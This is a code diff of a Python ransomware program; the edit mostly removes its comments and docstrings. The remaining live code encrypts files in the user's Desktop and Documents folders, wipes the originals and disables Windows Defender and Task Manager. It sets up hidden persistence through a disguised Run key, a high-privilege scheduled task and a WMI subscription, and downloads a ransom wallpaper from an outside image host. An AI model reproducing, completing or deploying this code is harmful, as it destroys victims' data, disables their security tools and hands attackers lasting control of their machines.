@@ -14,19 +14,16 @@ from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 from cryptography.hazmat.backends import default_backend
 import hashlib
 
-# ==================== ENHANCED ENCRYPTION SYSTEM ====================
 class CryptoEngine:
     def __init__(self, master_seed):
-        """Initialize with a master seed (float between 0-1)"""
         self.master_seed = master_seed
         self.backend = default_backend()
         
     def _chaotic_keygen(self, length=64):
-        """Generate unpredictable key using logistic map chaos"""
         key = bytearray()
         x = self.master_seed
         for _ in range(length):
-            x = 3.999 * x * (1 - x)  # Chaotic system at edge of chaos
+            x = 3.999 * x * (1 - x)  
             key.append(int(x * 256) % 256)
         return bytes(key)
     
@@ -42,24 +39,19 @@ class CryptoEngine:
         return kdf.derive(self._chaotic_keygen())
     
     def encrypt_file(self, file_path):
-        """AES-256 encryption with integrity protection"""
         try:
             if file_path.endswith('.airf'):
                 return
 
-            # Generate cryptographic nonces
             salt = os.urandom(32)
             iv = os.urandom(16)
             
-            # Derive keys
             master_key = self._derive_key(salt)
-            enc_key = master_key[:32]  # AES-256
-            auth_key = master_key[32:]  # HMAC key
+            enc_key = master_key[:32]  
+            auth_key = master_key[32:]  
 
-            # Calculate file fingerprint
             file_hash = hashlib.blake2b(file_path.encode()).digest()
             
-            # Initialize cipher
             cipher = Cipher(
                 algorithms.AES(enc_key),
                 modes.OFB(iv),
@@ -68,21 +60,17 @@ class CryptoEngine:
             encryptor = cipher.encryptor()
             padder = padding.PKCS7(128).padder()
 
-            # Secure temp file handling
             temp_path = f"{file_path}.tmp"
             with open(file_path, 'rb') as infile, open(temp_path, 'wb') as outfile:
-                # Write crypto headers
                 outfile.write(salt)
                 outfile.write(iv)
                 outfile.write(file_hash)
                 
-                # Encrypt in chunks and write HMAC for each
                 chunk_size = 8192
                 while chunk := infile.read(chunk_size):
                     padded = padder.update(chunk)
                     encrypted = encryptor.update(padded)
                     
-                    # Generate HMAC for the encrypted chunk
                     h = hmac.HMAC(auth_key, hashes.SHA256(), backend=self.backend)
                     h.update(encrypted)
                     chunk_tag = h.finalize()
@@ -90,23 +78,19 @@ class CryptoEngine:
                     outfile.write(encrypted)
                     outfile.write(chunk_tag)
                 
-                # Finalize encryption
                 final = padder.finalize()
                 encrypted_final = encryptor.update(final) + encryptor.finalize()
                 outfile.write(encrypted_final)
 
-            # Atomic replacement with .airf extension
             os.replace(temp_path, f"{file_path}.airf")
             os.remove(file_path)
             
-            # Wipe the original file securely
             self._secure_wipe(file_path)
             
         except Exception as e:
             print(f"! Encryption failed for {file_path}: {str(e)[:100]}")
 
     def _secure_wipe(self, file_path, passes=3):
-        """Securely wipe original file"""
         try:
             with open(file_path, 'ba+') as f:
                 length = f.tell()
@@ -121,12 +105,9 @@ class CryptoEngine:
             except:
                 pass
 
-# ==================== SYSTEM MANIPULATION ====================
 def disable_protections():
-    """Disable security systems"""
     try:
         print("[+] Attempting to disable Windows Defender...")
-        # Disable Windows Defender
         script_path = os.path.abspath(sys.argv[0])
         ps_commands = [
             'Set-MpPreference -DisableRealtimeMonitoring $true',
@@ -140,7 +121,6 @@ def disable_protections():
             subprocess.run(['powershell', '-Command', cmd], capture_output=True, shell=True)
         
         print("[+] Attempting to disable Task Manager...")
-        # Disable Task Manager via Registry
         try:
             key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
             with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as key:
@@ -152,7 +132,6 @@ def disable_protections():
         print(f"! Protection disable failed: {e}")
 
 def set_wallpaper(img_url):
-    """Set desktop wallpaper from URL"""
     try:
         print("[+] Downloading wallpaper...")
         path = os.path.join(os.environ['TEMP'], 'wallpaper.png')
@@ -164,14 +143,12 @@ def set_wallpaper(img_url):
         print(f"! Wallpaper set failed: {e}")
 
 def establish_persistence():
-    """Enterprise-grade persistence that survives reboots and user changes"""
     try:
         print("[+] Establishing military-grade persistence...")
         
         script_path = os.path.abspath(sys.argv[0])
         exe_path = script_path.replace('.py', '.exe') if script_path.endswith('.py') else script_path
 
-        # 1. Registry Run Key (User Level - Hidden)
         try:
             with winreg.OpenKey(
                 winreg.HKEY_CURRENT_USER,
@@ -180,15 +157,14 @@ def establish_persistence():
             ) as key:
                 winreg.SetValueEx(
                     key,
-                    "WindowsDefenderUpdate",  # Disguised name
+                    "WindowsDefenderUpdate",  
                     0,
                     winreg.REG_SZ,
-                    f'"{exe_path}" /silent'  # Hidden execution
+                    f'"{exe_path}" /silent'  
                 )
         except Exception as e:
             print(f"! Registry Run failed: {e}")
 
-        # 2. Scheduled Task (System Level - Highest Privileges)
         try:
             task_xml = f'''
             <Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
@@ -227,7 +203,6 @@ def establish_persistence():
             </Task>
             '''
             
-            # Write XML to temp file
             with open(os.path.join(os.environ['TEMP'], 'task.xml'), 'w') as f:
                 f.write(task_xml)
                 
@@ -241,7 +216,6 @@ def establish_persistence():
         except Exception as e:
             print(f"! Scheduled Task failed: {e}")
 
-        # 3. WMI Event Subscription (Permanent)
         try:
             subprocess.run([
                 'powershell.exe',
@@ -268,25 +242,19 @@ def establish_persistence():
     except Exception as e:
         print(f"!! Critical persistence failure: {e}")
 
-# ==================== MAIN OPERATION ====================
 def main():
     try:
         print("[+] Starting ransomware...")
         
-        # Phase 0: Persistence
         establish_persistence()
         
-        # Phase 1: System takeover
         disable_protections()
         
-        # Phase 2: Set wallpaper
         set_wallpaper("https://i.postimg.cc/tTY5tH5v/Screenshot-2025-07-28-181037.png")
         
-        # Phase 3: File encryption
         print("[+] Starting encryption...")
-        cryptor = CryptoEngine(0.3141592653589793)  # Pi seed
+        cryptor = CryptoEngine(0.3141592653589793)  
         
-        # Target multiple directories
         targets = [
             os.path.expanduser("~/Desktop"),
             os.path.expanduser("~/Documents"),
